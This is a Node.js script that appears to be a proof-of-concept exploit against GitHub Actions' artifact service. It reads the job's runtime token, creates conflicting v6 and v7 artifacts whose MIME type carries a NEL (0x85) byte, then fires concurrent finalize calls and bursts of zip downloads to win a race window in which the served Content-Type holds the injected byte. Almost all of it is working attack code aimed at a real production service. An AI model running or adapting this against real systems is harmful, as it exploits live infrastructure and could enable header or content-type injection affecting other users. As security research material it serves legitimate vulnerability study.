// WINDOW race: the "confused" state (stored mime = weird from v6, served via
// v7 echo) may exist only transiently while a second finalize reconciles the
// (run,name) record. So: finalize once to learn the id, then fire a SECOND
// finalize concurrently with a burst of REST /zip reads, catching any read
// whose served Content-Type carries 0x85.
import crypto from 'node:crypto';
import https from 'node:https';

const RESULTS = process.env.ACTIONS_RESULTS_URL;
const RT = process.env.ACTIONS_RUNTIME_TOKEN;
const GH = process.env.GH_TOKEN;
const REPO = process.env.GITHUB_REPOSITORY;
if (!RESULTS || !RT) { console.log('FATAL missing ACTIONS_* env'); process.exit(1); }
const claims = JSON.parse(Buffer.from(RT.split('.')[1], 'base64url').toString());
const scope = String(claims.scp || '').split(' ').find(s => s.startsWith('Actions.Results:'));
const [, runId, jobId] = scope.split(':');

const WEIRD = '\u0085application/json';
const CLEAN = 'application/json';
const ROUNDS = Number(process.env.ROUNDS || 40);
const BURST = Number(process.env.BURST || 40);
const PLACEHOLDER = Buffer.from('{"probe":"placeholder"}');

function twirp(method, body) {
  return fetch(`${RESULTS.replace(/\/?$/, '/')}twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
    method: 'POST', headers: { Authorization: `Bearer ${RT}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  }).then(async r => ({ status: r.status, text: await r.text() }));
}
function put(url, data, ct) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const h = { 'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2021-08-06', 'Content-Length': Buffer.byteLength(data) };
    if (ct) h['x-ms-blob-content-type'] = ct;
    const req = https.request({ method: 'PUT', hostname: u.hostname, path: u.pathname + u.search, headers: h },
      res => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
    req.on('error', reject); req.write(data); req.end();
  });
}
const create = (name, v, m) => twirp('CreateArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, version: v, mime_type: m });
const finalize = (name) => twirp('FinalizeArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name,
  size: String(PLACEHOLDER.length), hash: `sha256:${crypto.createHash('sha256').update(PLACEHOLDER).digest('hex')}` });

function restDownload(id) {
  return new Promise(resolve => {
    https.request({ method: 'GET', hostname: 'api.github.com', path: `/repos/${REPO}/actions/artifacts/${id}/zip`,
      headers: { Accept: 'application/vnd.github.v3+json', Authorization: `Bearer ${GH}`, 'User-Agent': 'race3' } },
      res => {
        res.resume();
        const loc = res.headers.location;
        if (!loc) return resolve(null);
        const u = new URL(loc);
        const rsct = (u.search.match(/[?&]rsct=([^&]*)/) || [])[1] || '';
        // decide from rsct bytes without a second hop (faster, tighter window)
        let dec = ''; try { dec = decodeURIComponent(rsct); } catch { dec = rsct; }
        const hex = Buffer.from(dec, 'latin1').toString('hex');
        resolve({ rsct, hex, nel: Buffer.from(dec, 'latin1').includes(0x85) });
      }).on('error', () => resolve(null)).end();
  });
}

const winners = [];
for (let i = 0; i < ROUNDS; i++) {
  const name = `w-${i}-${Date.now()}`;
  const reverse = i % 2 === 1;
  const specs = reverse ? [[7, CLEAN], [6, WEIRD]] : [[6, WEIRD], [7, CLEAN]];
  try {
    const created = await Promise.all(specs.map(([v, m]) => create(name, v, m)));
    const sas = created.map(c => { try { return JSON.parse(c.text).signed_upload_url; } catch { return null; } });
    if (sas.some(s => !s)) { console.log(`r${i} creates=${created.map(c=>c.status)} NO-SAS`); continue; }
    await Promise.all(sas.map(s => put(s, PLACEHOLDER, WEIRD)));
    const f1 = await finalize(name);
    let id = null; try { id = JSON.parse(f1.text).artifact_id; } catch {}
    if (!id) { console.log(`r${i} f1=${f1.status} NO-ID`); continue; }
    // fire a SECOND finalize + a burst of reads concurrently to catch the window
    const burst = [];
    for (let k = 0; k < BURST; k++) burst.push(restDownload(id));
    const [, ...reads] = await Promise.all([finalize(name), ...burst]);
    const hits = reads.filter(r => r && r.nel);
    const seen = [...new Set(reads.filter(Boolean).map(r => r.rsct))];
    console.log(`r${i} rev=${reverse} id=${id} reads=${reads.filter(Boolean).length} NELhits=${hits.length} seen=${JSON.stringify(seen).slice(0,80)}`);
    if (hits.length) { winners.push({ i, id, ...hits[0] }); }
  } catch (e) { console.log(`r${i} EXC ${String(e).slice(0,80)}`); }
}
console.log(`\n=== WINNERS ${winners.length} ===`);
for (const w of winners) console.log('WINNER ' + JSON.stringify(w));
console.log(winners.length ? '*** NEL rsct CAUGHT IN WINDOW ***' : 'none');
